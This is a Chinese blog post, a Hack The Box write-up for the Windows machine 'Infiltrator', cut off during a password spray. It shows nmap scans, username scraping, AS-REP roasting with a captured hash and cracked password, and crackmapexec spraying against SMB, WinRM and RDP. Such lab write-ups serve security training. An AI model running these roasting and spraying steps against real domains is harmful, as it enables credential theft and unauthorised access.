<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Infiltrator(HTB) · zIxyd's Blog</title><meta name="description" content="收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%94%B6%E9%9B%86"><span class="toclist-text">收集</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%AB%8B%E8%B6%B3"><span class="toclist-text">立足</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%94%B6%E9%9B%86"><span class="toclist-text">收集</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%AB%8B%E8%B6%B3"><span class="toclist-text">立足</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Infiltrator(HTB)</a></h3></div><div class="post-content"><p><h2 id="收集"><a href="#收集" class="headerlink" title="收集"></a>收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> nmap/ports.txt               </span><br><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Mon Sep  2 03:33:02 2024 as: nmap -p- --min-rate 10000 -oN nmap/ports.txt 10.10.11.31</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.31 (10.10.11.31)</span><br><span class="line">Host is up (0.062s latency).</span><br><span class="line">Not shown: 65511 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49692/tcp open  unknown</span><br><span class="line">49693/tcp open  unknown</span><br><span class="line">49696/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49743/tcp open  unknown</span><br><span class="line">49865/tcp open  unknown</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Mon Sep  2 03:33:15 2024 -- 1 IP address (1 host up) scanned in 13.47 seconds</span></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> nmap/details.txt             </span><br><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Mon Sep  2 03:33:38 2024 as: nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,15220,15230,49667,49692,49693,49696,49720,49743,49865 -oN nmap/details.txt 10.10.11.31</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.31 (10.10.11.31)</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Infiltrator.htb</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-02 07:23:48Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-02T07:27:06+00:00; -9m58s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-02T07:27:06+00:00; -9m58s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-02T07:27:06+00:00; -9m58s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-02T07:27:06+00:00; -9m58s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-02T07:27:06+00:00; -9m58s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span><br><span class="line">| Not valid before: 2024-07-30T13:20:17</span><br><span class="line">|_Not valid after:  2025-01-29T13:20:17</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Domain_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: infiltrator.htb</span><br><span class="line">|   DNS_Computer_Name: dc01.infiltrator.htb</span><br><span class="line">|   DNS_Tree_Name: infiltrator.htb</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-09-02T07:26:27+00:00</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49693/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49696/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49720/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49743/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49865/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-09-02T07:26:28</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -9m58s, deviation: 0s, median: -9m58s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Sep  2 03:37:06 2024 -- 1 IP address (1 host up) scanned in 207.85 seconds</span></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">tail</span> /etc/hosts -n 1             </span><br><span class="line">10.10.11.31 infiltrator.htb dc01.infiltrator.htb</span><br></pre></td></tr></table></figure>

<p>80端口开放的服务只是一个静态网站，目录扫描扫了三个字典都没有价值</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904172135.png"></p>
<p>子域名也无收获</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ffuf -u http://infiltrator.htb/ -H &quot;HOST: FUZZ.infiltrator.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 31235</span><br></pre></td></tr></table></figure>

<p>SMB和RPC都无法使用空密码连接</p>
<h2 id="立足"><a href="#立足" class="headerlink" title="立足"></a>立足</h2><p>在页面中有7个用户名</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904172720.png"></p>
<p>可以将7个用户名收集起来，进行asreproasting 攻击，我喜欢用xpath来收集html中的信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> getUsername.py </span><br><span class="line">import requests</span><br><span class="line">from lxml  import etree</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://infiltrator.htb/&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">content = response.content</span><br><span class="line"></span><br><span class="line">tree = etree.HTML(content)</span><br><span class="line">data = tree.xpath(<span class="string">&#x27;//h4/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    search = re.search(<span class="string">&quot;\.0(\d)&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span>  search:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ python3 getUsername.py &gt; username.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> username.txt  </span><br><span class="line">.01 David Anderson</span><br><span class="line">.02 Olivia Martinez</span><br><span class="line">.03 Kevin Turner</span><br><span class="line">.04 Amanda Walker</span><br><span class="line">.05 Marcus Harris</span><br><span class="line">.06 Lauren Clark</span><br><span class="line">.07 Ethan Rodriguez</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ sed -i <span class="string">&#x27;s/.0[0-7] //&#x27;</span> username.txt </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> username.txt                      </span><br><span class="line">David Anderson</span><br><span class="line">Olivia Martinez</span><br><span class="line">Kevin Turner</span><br><span class="line">Amanda Walker</span><br><span class="line">Marcus Harris</span><br><span class="line">Lauren Clark</span><br><span class="line">Ethan Rodriguez</span><br></pre></td></tr></table></figure>

<p>事实上，这些用户全名称并不能就说明是域用户名；由于我无法知道域用户名是什么格式的，我可以借助 <a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a>工具暴力枚举</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ /home/kali/tools/username-anarchy/username-anarchy --input-file  username.txt  &gt;format_username.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cat</span> format_username.txt); <span class="keyword">do</span> GetNPUsers.py -no-pass -dc-ip 10.10.11.31 infiltrator.htb/<span class="variable">$&#123;user&#125;</span> | grep -v Impacket; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> david</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line"></span><br><span class="line">[SNIP]</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> l.clark</span><br><span class="line">$krb5asrep$23<span class="variable">$l</span>.clark@INFILTRATOR.HTB:77fd776c07d2797696e0fd80e188e4e4<span class="variable">$2ed3d4cfc2311ef5dce7bd11b022bfdfa86c03cc0ad45d9cb49b3367c3b7511b5e587c79b9db21bd20aaf681b57d8067831381425ad24058ca42ac0f7c0c0b89371ef36e63f408dde0eaff099df54435f12af18e1c36af151842ed5b6cefaf8a28018506b62a519b60a24c503134a0bb944f0afc0bf92adbc130a4fa2017f2b229f59224d47b397d5e980308e37bd9348707673073c14e7c37219238683f999f1c3cc5f471495e3a8d4a57d900f91c97f7eac9129f5c4091a089d917704ad426b05cb68cfe0f711eced84030b3a370e4f8eb8fa9ad7e8e20061a9c4e4a0d4e12ff60cc9a2cddeb8e3765c564773e15e972d8</span></span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> lclark</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line"></span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>

<p>能够获取到<code>l.clark</code>用户的TGS;利用john破解出密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ john --show l.clark.hash                                             </span><br><span class="line">$krb5asrep$23$l.clarki@INFILTRATOR.HTB:WAT?watismypass!</span><br></pre></td></tr></table></figure>

<p>可惜的是，l.clark无法对winrm和rdp其效果，而smb中也无收获</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.31 -u <span class="string">&#x27;l.clark&#x27;</span>  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>           </span><br><span class="line">SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec winrm 10.10.11.31 -u <span class="string">&#x27;l.clark&#x27;</span>  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>   </span><br><span class="line">SMB         10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)</span><br><span class="line">HTTP        10.10.11.31     5985   DC01             [*] http://10.10.11.31:5985/wsman</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\l.clark:WAT?watismypass!</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec rdp 10.10.11.31 -u <span class="string">&#x27;l.clark&#x27;</span>  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>   </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)</span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\l.clark:WAT?watismypass! </span><br></pre></td></tr></table></figure>

<p>通过<code>l.clark</code>用户名，我们知道了域用户名的格式，那么我们尝试密码喷洒到其他用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ /home/kali/tools/username-anarchy/username-anarchy --input-file  username.txt  --select-format f.last &gt; new_username.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> new_username.txt             </span><br><span class="line">d.anderson</span><br><span class="line">o.martinez</span><br><span class="line">k.turner</span><br><span class="line">a.walker</span><br><span class="line">m.harris</span><br><span class="line">l.clark</span><br><span class="line">e.rodriguez</span><br></pre></td></tr></table></figure>

<p>密码喷洒</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec rdp 10.10.11.31 -u new_username.txt  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>    </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)</span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\l.clark:WAT?watismypass! </span><br><span class="line">RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec winrm 10.10.11.31 -u new_username.txt  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>   </span><br><span class="line">SMB         10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)</span><br><span class="line">HTTP        10.10.11.31     5985   DC01             [*] http://10.10.11.31:5985/wsman</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\k.turner:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\a.walker:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\m.harris:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\l.clark:WAT?watismypass!</span><br><span class="line">WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass!</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.31 -u new_username.txt  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span>   </span><br><span class="line">SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] 